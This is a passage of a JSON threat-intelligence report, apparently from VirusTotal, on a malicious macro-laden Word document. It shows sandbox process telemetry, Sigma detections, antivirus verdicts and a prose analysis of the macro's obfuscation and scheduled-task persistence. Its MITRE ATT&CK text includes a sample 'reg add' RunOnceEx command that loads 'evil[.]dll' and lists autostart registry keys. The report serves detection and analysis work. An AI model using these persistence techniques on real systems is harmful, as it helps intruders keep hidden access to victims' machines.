                "ProcessId": "3484",
                "Product": "Microsoft \\xae Windows Script Host",
                "Description": "Microsoft \\xae Windows Based Script Host",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-4C32-6536-6600-000000004800}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD",
                "OriginalFileName": "wscript.exe",
                "ParentImage": "C:\\Windows\\explorer.exe",
                "FileVersion": "5.812.10240.16384",
                "ParentProcessId": "4716",
                "CurrentDirectory": "C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
                "CommandLine": "\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OCu3HBg7gyI9aUaB.vbs\" ",
                "EventID": "1",
                "LogonGuid": "C784477D-4C31-6536-5243-030000000000",
                "LogonId": "213842",
                "Image": "C:\\Windows\\System32\\wscript.exe",
                "IntegrityLevel": "Medium",
                "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
                "UtcTime": "1700279485",
                "RuleName": "-"
              }
            }
          ],
          "rule_level": "medium",
          "rule_id": "8b884f70bb47a8e06faf8f548fcfef77fe3802d22c310c4cdfa01f35cb030bac",
          "rule_author": "Michael Haag",
          "rule_description": "Detects script file execution (.js, .jse, .vba, .vbe, .vbs, .wsf) by Wscript/Cscript"
        },
        {
          "rule_title": "Potential WWlib.DLL Sideloading",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "0",
                "ImageLoaded": "\\wwlib.dll"
              }
            }
          ],
          "rule_level": "medium",
          "rule_id": "acfdd695b50334901b76498dea74721b8b3767958af4dfdb031aebc613d6ff72",
          "rule_author": "X__Junior (Nextron Systems)",
          "rule_description": "Detects potential DLL sideloading of \"wwlib.dll\""
        },
        {
          "rule_title": "Suspicious New Instance Of An Office COM Object",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "TerminalSessionId": "1",
                "ProcessGuid": "{C784477D-34AB-6558-4606-000000004800}",
                "ProcessId": "6368",
                "Product": "Microsoft Office 2016",
                "Description": "Microsoft Word",
                "Company": "Microsoft Corporation",
                "ParentProcessGuid": "{C784477D-4C2C-6536-0F00-000000004800}",
                "User": "DESKTOP-B0T93D6\\george",
                "Hashes": "MD5=CE33FC3C687D3C01159A8CAEA7F5482E,SHA256=5D75D0EA8BBB5B652F7B72CF728C00322BD486D54A5C4978CEACDF70B4317EE6,IMPHASH=1B2B96B0763DACAFA277667CA093F96D",
                "OriginalFileName": "WinWord.exe",
                "ParentImage": "C:\\Windows\\System32\\svchost.exe",
                "FileVersion": "16.0.4266.1001",
                "ParentProcessId": "840",
                "CurrentDirectory": "C:\\Windows\\system32\\",
                "CommandLine": "\"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE\" /Automation -Embedding",
                "EventID": "1",
                "LogonGuid": "C784477D-4C31-6536-EE42-030000000000",
                "LogonId": "213742",
                "Image": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE",
                "IntegrityLevel": "High",
                "ParentCommandLine": "C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p",
                "UtcTime": "1700279467",
                "RuleName": "-"
              }
            }
          ],
          "rule_level": "medium",
          "rule_id": "ffbbcedfb9a1fd41ebb288154c10cf5cf869eb25195708be30f8a9df74f411cc",
          "rule_author": "Nasreddine Bencherchali (Nextron Systems)",
          "rule_description": "Detects an svchost process spawning an instance of an office application. This happens when the initial word application creates an instance of one of the Office COM objects such as 'Word.Application', 'Excel.Application', etc.\nThis can be used by malicious actors to create malicious Office documents with macros on the fly. (See vba2clr project in the references)\n"
        },
        {
          "rule_title": "Office Macro File Creation",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "match_context": [
            {
              "values": {
                "EventID": "11",
                "ProcessId": "6368",
                "TargetFilename": "C:\\Users\\george\\Desktop\\~$readme.docm",
                "ProcessGuid": "{C784477D-34AB-6558-4606-000000004800}",
                "CreationUtcTime": "1700279471",
                "UtcTime": "1700279471",
                "RuleName": "-",
                "Image": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE"
              }
            },
            {
              "values": {
                "EventID": "0",
                "TargetFilename": "C:\\Users\\<USER>\\AppData\\Local\\Temp\\e2a3edc708016316477228de885f0c39.docm"
              }
            },
            {
              "values": {
                "EventID": "0",
                "TargetFilename": "C:\\Users\\<USER>\\AppData\\Local\\Temp\\~$a3edc708016316477228de885f0c39.docm"
              }
            },
            {
              "values": {
                "EventID": "0",
                "TargetFilename": "C:\\Users\\<USER>\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm"
              }
            }
          ],
          "rule_level": "low",
          "rule_id": "27801b0f98df1ce7686b07b693c59e734c47189ef3db24ea1093f6f00ff2ed67",
          "rule_author": "Nasreddine Bencherchali (Nextron Systems)",
          "rule_description": "Detects the creation of a new office macro files on the systems"
        }
      ],
      "meaningful_name": "b5c001cbcd72b919e9b05e3281cc4e4914fee0748b3d81954772975630233a6e.docx",
      "trid": [
        {
          "file_type": "Word Microsoft Office Open XML Format document (with Macro)",
          "probability": 53
        },
        {
          "file_type": "Word Microsoft Office Open XML Format document",
          "probability": 23.9
        },
        {
          "file_type": "Open Packaging Conventions container",
          "probability": 17.8
        },
        {
          "file_type": "ZIP compressed archive",
          "probability": 4
        },
        {
          "file_type": "PrintFox/Pagefox bitmap (640x800)",
          "probability": 1
        }
      ],
      "sigma_analysis_summary": {
        "Sigma Integrated Rule Set (GitHub)": {
          "high": 3,
          "medium": 4,
          "critical": 0,
          "low": 1
        },
        "Joe Security Rule Set (GitHub)": {
          "high": 0,
          "medium": 0,
          "critical": 3,
          "low": 0
        }
      },
      "sandbox_verdicts": {
        "Zenbox": {
          "category": "malicious",
          "confidence": 100,
          "sandbox_name": "Zenbox",
          "malware_classification": [
            "MALWARE",
            "EVADER"
          ]
        },
        "VMRay": {
          "category": "malicious",
          "sandbox_name": "VMRay",
          "malware_classification": [
            "MALWARE"
          ],
          "malware_names": [
            "Mal/Generic-S"
          ]
        },
        "DOCGuard": {
          "category": "malicious",
          "sandbox_name": "DOCGuard",
          "malware_classification": [
            "MALWARE"
          ]
        }
      },
      "sha256": "b5c001cbcd72b919e9b05e3281cc4e4914fee0748b3d81954772975630233a6e",
      "type_extension": "docx",
      "tags": [
        "obfuscated",
        "open-file",
        "exe-pattern",
        "handle-file",
        "macro-run-file",
        "docx",
        "create-file",
        "run-file",
        "macros",
        "calls-wmi",
        "long-sleeps",
        "environ",
        "write-file",
        "persistence",
        "create-ole"
      ],
      "last_analysis_date": 1704347813,
      "unique_sources": 4,
      "first_submission_date": 1700279400,
      "ssdeep": "24576:DKkIwZMuhdVmTmS6r5MvUw05nUIkMqNHMt7IAAG:WkIwZMuh2Wqvd05nUBMHtkAAG",
      "bundle_info": {
        "highest_datetime": "1980-01-01 00:00:00",
        "lowest_datetime": "1980-01-01 00:00:00",
        "num_children": 16,
        "extensions": {
          "xml": 10,
          "bin": 1,
          "png": 1,
          "PNG": 1
        },
        "file_types": {
          "XML": 13,
          "Microsoft Office": 1,
          "PNG": 2
        },
        "type": "DOCX",
        "uncompressed_size": 1366854
      },
      "md5": "e2a3edc708016316477228de885f0c39",
      "sha1": "3aa803baf5027c57ec65eb9b47daad595ba80bac",
      "magic": "Microsoft Word 2007+",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 9,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 2,
        "malicious": 43,
        "undetected": 19
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "failure",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.MSWord.Bomber.4!c",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Elastic": {
          "category": "malicious",
          "engine_name": "Elastic",
          "engine_version": "4.0.121",
          "result": "malicious (high confidence)",
          "method": "blacklist",
          "engine_update": "20231208"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "GT:VB.Macros.Bomber.2.F4D2BE3C",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "OLE.APT.37154",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Skyhigh": {
          "category": "malicious",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": "Artemis!Trojan",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "GT:VB.Macros.Bomber.2.F4D2BE3C",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Sangfor": {
          "category": "malicious",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": "VBA.Sus.Obf",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.134.50626",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Alibaba": {
          "category": "malicious",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": "TrojanDownloader:Office97/Obfuse.0f864196",
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.134.50626",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Trustlook": {
          "category": "failure",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "VirIT": {
          "category": "malicious",
          "engine_name": "VirIT",
          "engine_version": "9.5.610",
          "result": "Office.VBA_Macro_Heur",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "result": "ISB.Dropper!gen4",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": null,
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28512",
          "result": "a variant of VBA/Agent.ANK",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.485",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "TrendMicro-HouseCall": {
          "category": "malicious",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": "TROJ_FRS.0NA103LD23",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "VBS:Obfuscated-gen [Trj]",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "ClamAV": {
          "category": "malicious",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": "Doc.Dropper.Valyria-10016784-0",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "UDS:DangerousObject.Multi.Generic",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "GT:VB.Macros.Bomber.2.F4D2BE3C",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Heur.Macro.Generic.a.37efa4f9",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "TACHYON": {
          "category": "malicious",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-04.01",
          "result": "Suspicious/WOX.DRP.Gen",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "GT:VB.Macros.Bomber.2.F4D2BE3C (B)",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "result": "Heuristic.HEUR/Macro.Downloader.MRTF.Gen",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5026",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "TrendMicro": {
          "category": "malicious",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": "TROJ_FRS.0NA103LD23",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "GT:VB.Macros.Bomber.2.F4D2BE3C",
          "method": "blacklist",
          "engine_update": "20240101"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "result": "Troj/DocDrp-ALC",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "SentinelOne": {
          "category": "malicious",
          "engine_name": "SentinelOne",
          "engine_version": "23.4.2.3",
          "result": "Static AI - Malicious OPENXML",
          "method": "blacklist",
          "engine_update": "20231119"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.37101B:27.34440",
          "result": "GT:VB.Macros.Bomber.2.F4D2BE3C",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1704344419",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "HEUR/Macro.Downloader.MRTF.Gen",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "PP97M/Valyria.JJ.gen!Eldorado",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Antiy-AVL": {
          "category": "malicious",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": "Trojan/MSOffice.Iscodtas.b",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Kingsoft": {
          "category": "malicious",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "result": "Win32.Troj.Undef.a",
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "result": "TrojanDownloader:O97M/Obfuse.VAL!MTB",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.153.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Xcitium": {
          "category": "undetected",
          "engine_name": "Xcitium",
          "engine_version": "36315",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "HEUR.VBA.CG.2",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "ViRobot": {
          "category": "malicious",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": "DOC.Z.Agent.878327",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "HEUR:Trojan.Script.Generic",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Avast-Mobile": {
          "category": "undetected",
          "engine_name": "Avast-Mobile",
          "engine_version": "240103-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.28",
          "result": "Malicious (score: 99)",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231230"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "result": "Trojan/DOC.Agent",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Acronis": {
          "category": "malicious",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": "suspicious",
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231229"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=82)",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240102"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Zoner": {
          "category": "malicious",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": "Probably Heur.W97ShellS",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Dropper.Agent/VBA!1.F035 (CLASSIC)",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan.VBA.Agent",
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "MaxSecure": {
          "category": "undetected",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "VBA/Valyria.6953!tr",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "VBS:Obfuscated-gen [Trj]",
          "method": "blacklist",
          "engine_update": "20240104"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231102"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240103"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": null
        }
      },
      "reputation": -7,
      "sigma_analysis_stats": {
        "high": 3,
        "medium": 4,
        "critical": 3,
        "low": 1
      },
      "crowdsourced_ai_results": [
        {
          "category": "code_insight",
          "source": "hispasec",
          "verdict": "malicious",
          "id": "b5c001cbcd72b919e9b05e3281cc4e4914fee0748b3d81954772975630233a6e-file-hispasec",
          "analysis": "The macros extracted from the document exhibit several signs of malicious intent. \n\n1. Obfuscation: The code uses string concatenation to obfuscate function calls and file paths, which is a common technique used by malware authors to evade detection.\n\n2. Suspicious Function Calls: The macro uses suspicious functions such as \"GetObject\", \"CreateObject\", \"CreateTextFile\", and \"WriteLine\". These functions are often used in malicious macros to execute arbitrary commands or write malicious scripts to disk.\n\n3. Attempts at Persistence: The macro attempts to achieve persistence by creating scheduled tasks using the \"schtasks\" command. This allows the malicious script to be executed periodically even after the system reboots.\n\n4. Manipulation of Macro Security Settings: The macro manipulates security settings by disabling alerts and screen updating. This can prevent users from noticing any unusual activity on their system.\n\n5. Writing Entries in the Windows Registry: Although the macro does not directly write entries to the Windows registry, it creates VBScript files that could potentially modify the registry.\n\n6. Downloading, Writing, and Executing .exe: The macro writes and executes batch (.bat) files, which could potentially download and execute malicious executables.\n\n7. Self-Replication and Propagation Mechanisms: The macro does not appear to have self-replication or propagation mechanisms, but it does create multiple copies of the same VBScript and batch files.\n\n8. Disabling Alerts and Screen Updating: The macro disables alerts and screen updating, which can hide its activities from the user.\n\nIn conclusion, based on the above analysis, the macros extracted from the document are deemed to be malicious."
        }
      ]
    },
    "type": "file",
    "id": "b5c001cbcd72b919e9b05e3281cc4e4914fee0748b3d81954772975630233a6e",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/b5c001cbcd72b919e9b05e3281cc4e4914fee0748b3d81954772975630233a6e"
    }
  },
  "mitre": {
    "data": {
      "VMRay": {
        "tactics": [
          {
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Office macro uses the writeline function."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "id": "TA0002",
            "name": "Execution"
          },
          {
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "description": "This technique has been deprecated. Please use Command and Scripting Interpreter where appropriate.\nAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in Spearphishing Attachment and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through Exploitation for Client Execution, where adversaries will rely on macros being allowed or that the user will accept to activate them.\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit , Veil , and PowerSploit  are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. ",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Office macro uses the writeline function."
                  }
                ],
                "link": "https://attack.mitre.org/techniques/T1064/",
                "id": "T1064",
                "name": "Scripting"
              }
            ],
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "id": "TA0005",
            "name": "Defense Evasion"
          }
        ]
      },
      "Zenbox": {
        "tactics": [
          {
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\nThe following run keys are created by default on Windows systems:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\" \nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\nThe following Registry keys can be used to set startup folder items for persistence:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n\nThe following Registry keys can control automatic startup of services during boot:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\n\nPrograms listed in the load value of the registry key 